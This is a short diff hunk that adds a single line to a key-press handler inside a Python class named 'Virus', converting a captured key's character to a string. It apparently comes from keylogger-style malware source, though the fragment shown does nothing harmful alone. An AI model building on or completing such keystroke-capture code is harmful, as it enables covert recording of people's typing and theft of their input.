@@ -89,3 +89,4 @@ class Virus(object):
 
         try:
             if type(key) == KeyCode:
+                keystr = str(key.char)
